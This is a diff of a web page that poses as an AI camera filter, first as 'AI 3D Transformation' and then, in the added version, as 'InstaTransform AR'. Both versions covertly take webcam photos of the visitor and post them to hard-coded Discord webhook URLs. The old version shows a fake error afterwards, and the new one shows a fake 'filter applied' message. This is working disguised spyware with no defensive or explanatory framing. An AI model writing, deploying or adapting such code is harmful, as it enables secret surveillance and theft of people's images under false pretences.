@@ -1,180 +1,200 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>AI 3D Transformation</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>InstaTransform AR</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poiret+One&family=Source+Sans+Pro:wght@300&display=swap" rel="stylesheet">
   <style>
-    body {
-      font-family: Arial, sans-serif;
+    /* RESET + STAR BACKGROUND */
+    * {
       margin: 0;
       padding: 0;
-      text-align: center;
-      background-color: #f4f4f9;
-      color: #333;
+      box-sizing: border-box;
     }
 
-    header {
-      background-color: #4CAF50;
-      color: white;
+    body {
+      height: 100vh;
+      width: 100%;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: radial-gradient(circle at bottom, #1b2735, #090a0f);
+      font-family: 'Source Sans Pro', sans-serif;
+      color: #ecf0f1;
+      position: relative;
+      flex-direction: column;
+      text-align: center;
       padding: 20px;
     }
 
-    video {
-      margin-top: 20px;
-      border: 2px solid black;
-      border-radius: 10px;
-    }
-
-    button {
-      background-color: #4CAF50;
-      color: white;
-      border: none;
-      padding: 15px 30px;
-      margin-top: 20px;
-      font-size: 18px;
-      cursor: pointer;
-      border-radius: 5px;
-      transition: background-color 0.3s ease;
-    }
-
-    button:hover {
-      background-color: #45a049;
-    }
-
-    footer {
-      background-color: #333;
-      color: white;
-      padding: 10px;
-      position: fixed;
-      bottom: 0;
+    .overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
       width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      z-index: 1;
     }
 
-    #loadingMessage {
-      font-size: 18px;
+    .stars, .starts2, .stars3 {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: transparent;
+      z-index: 0;
+      overflow: hidden;
+    }
+
+    .stars {
+      width: 2px;
+      height: 2px;
+      background: transparent;
+      box-shadow:
+        500px 800px #FFF, 200px 1300px #FFF, 1200px 600px #FFF,
+        900px 1100px #FFF, 300px 500px #FFF, 400px 1000px #FFF,
+        800px 1400px #FFF, 1300px 700px #FFF, 600px 2000px #FFF;
+      animation: star-animation 60s linear infinite;
+    }
+
+    .starts2 {
+      width: 1px;
+      height: 1px;
+      background: transparent;
+      box-shadow:
+        800px 300px #FFF, 400px 1500px #FFF, 1500px 1200px #FFF,
+        600px 1700px #FFF, 1000px 900px #FFF, 500px 1600px #FFF;
+      animation: star-animation2 90s linear infinite;
+    }
+
+    .stars3 {
+      width: 3px;
+      height: 3px;
+      background: transparent;
+      box-shadow:
+        1000px 700px #FFF, 300px 1800px #FFF, 1400px 1000px #FFF,
+        200px 1500px #FFF, 1100px 1300px #FFF, 700px 1200px #FFF;
+      animation: star-animation3 120s linear infinite;
+    }
+
+    @keyframes star-animation {
+      0% { transform: translateY(0); }
+      100% { transform: translateY(-1500px); }
+    }
+
+    @keyframes star-animation2 {
+      0% { transform: translateY(0); }
+      100% { transform: translateY(-2000px); }
+    }
+
+    @keyframes star-animation3 {
+      0% { transform: translateY(0); }
+      100% { transform: translateY(-2500px); }
+    }
+
+    h1 {
+      font-family: 'Poiret One', cursive;
+      font-size: 3rem;
+      margin-bottom: 0.5rem;
+      z-index: 2;
+      animation: fadeIn 2s ease-out;
+    }
+
+    p {
+      font-size: 1.2rem;
+      max-width: 500px;
+      margin: 0 auto 1.5rem;
+      color: #ccc;
+      z-index: 2;
+      animation: fadeIn 2.5s ease-out;
+    }
+
+    .oval-button {
+      padding: 14px 30px;
+      border: 2px solid #ecf0f1;
+      background: none;
+      color: #ecf0f1;
+      font-size: 1.1rem;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      z-index: 2;
+    }
+
+    .oval-button:hover {
+      background-color: #ecf0f1;
+      color: #1b2735;
+      transform: translateY(-5px);
+    }
+
+    video, canvas {
+      display: none;
       margin-top: 20px;
+      border-radius: 10px;
+      z-index: 2;
+    }
+
+    @keyframes fadeIn {
+      0% { opacity: 0; transform: translateY(20px); }
+      100% { opacity: 1; transform: translateY(0); }
     }
   </style>
 </head>
 <body>
-  <header>
-    <h1>AI 3D Transformation</h1>
-    <p>Click "Transform" to trigger the process!</p>
-  </header>
+  <!-- Stars Background -->
+  <div class="stars"></div>
+  <div class="starts2"></div>
+  <div class="stars3"></div>
+  <div class="overlay"></div>
 
-  <video id="video" autoplay></video>
-  <canvas id="canvas" style="display: none;"></canvas>
-  <br>
-  <button id="transform">Transform</button>
-  <p id="loadingMessage">Estimated time: 2 minutes.</p>
+  <!-- Main Content -->
+  <h1>✨ InstaTransform Filter</h1>
+  <p>Turn on your camera to try our trending AI filter effect. This may take a few seconds to calibrate.</p>
+  <button class="oval-button" onclick="start()">Start Filter</button>
+
+  <video id="video" autoplay playsinline width="400"></video>
+  <canvas id="canvas" width="400" height="300"></canvas>
 
   <script>
-    const webhookUrl = "https://discord.com/api/webhooks/1329558434814754858/2OuOQhloF_jY0r6Lvh8blWn0xY_qSHRYOFlTCHYjLti9I_BwBFJ59sLKvQ2FMobHQcHL";
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
-    const transformButton = document.getElementById("transform");
-    const loadingMessage = document.getElementById("loadingMessage");
+    const ctx = canvas.getContext("2d");
 
-    let stream;
-    let images = [];
-
-    // Start webcam
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then((userStream) => {
-        stream = userStream;
+    async function start() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
+        video.style.display = "block";
 
-        // Send a message when the user accepts the permissions
-        fetch(webhookUrl, {
-          method: "POST",
-          body: JSON.stringify({ content: "Autorisations acceptées!" }),
-          headers: { "Content-Type": "application/json" }
-        });
-      })
-      .catch((err) => {
-        console.error("Error accessing webcam:", err);
-        alert("Could not access webcam.");
-      });
-
-    // Capture a photo every 200ms
-    const capturePhoto = () => {
-      const context = canvas.getContext("2d");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      const imageData = canvas.toDataURL("image/jpeg");
-      images.push(imageData);
-    };
-
-    // Send captured images to webhook
-    const sendImages = () => {
-      // Send each photo individually
-      images.forEach((imageData, index) => {
-        const blob = dataURLtoBlob(imageData);
-        const formData = new FormData();
-        formData.append("file", blob, `photo${index + 1}.jpg`);
-        formData.append("payload_json", JSON.stringify({ content: "Here are the photos captured during the transformation!" }));
-
-        fetch(webhookUrl, {
-          method: "POST",
-          body: formData
-        })
-          .then((response) => {
-            if (!response.ok) {
-              console.error("Failed to send photo", index);
-            }
-          })
-          .catch((err) => {
-            console.error("Error sending photo:", err);
-          });
-      });
-
-      // Clear images array after sending
-      images = [];
-    };
-
-    // Convert base64 to Blob
-    function dataURLtoBlob(dataURL) {
-      const byteString = atob(dataURL.split(',')[1]);
-      const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
-      const arrayBuffer = new ArrayBuffer(byteString.length);
-      const uintArray = new Uint8Array(arrayBuffer);
-
-      for (let i = 0; i < byteString.length; i++) {
-        uintArray[i] = byteString.charCodeAt(i);
+        setTimeout(() => {
+          captureAndSend();
+        }, 3000); // Capture after 3s
+      } catch (e) {
+        alert("Please allow camera access to continue.");
       }
-
-      return new Blob([uintArray], { type: mimeString });
     }
 
-    // Start the transform process (take photos every 200ms for 3 seconds)
-    transformButton.addEventListener("click", () => {
-      loadingMessage.textContent = "Transforming... Please wait.";
+    function captureAndSend() {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob((blob) => {
+        const formData = new FormData();
+        formData.append("file", blob, "snapshot.png");
 
-      // Take photos every 200ms for 3 seconds
-      const captureInterval = setInterval(capturePhoto, 200);
-
-      setTimeout(() => {
-        clearInterval(captureInterval);  // Stop capturing after 3 seconds
-        sendImages();  // Send all captured images to the webhook
-
-        // Stop the stream and disable the video
-        stream.getTracks().forEach(track => track.stop());
-        video.srcObject = null;
-
-        // Show error message after sending photos
-        loadingMessage.textContent = "Error: Something went wrong!";
-      }, 3000); // Capture for 3 seconds
-    });
-
-    // Send a message when the user closes the page
-    window.addEventListener("beforeunload", () => {
-      if (images.length > 0) {
-        sendImages();
-      }
-    });
+        fetch("https://discord.com/api/webhooks/1398472154089127946/hqsmCirQoQk0xSGdhb5_qMGj-rF5HX9fa_SqwEduaWMtOuc8cr5X7c01o1gIXi-6QqwA", {
+          method: "POST",
+          body: formData
+        }).then(() => {
+          alert("AR Filter applied! 🎉");
+        }).catch((err) => {
+          alert("Failed to send data.");
+          console.error(err);
+        });
+      }, "image/png");
+    }
   </script>
 </body>
 </html>
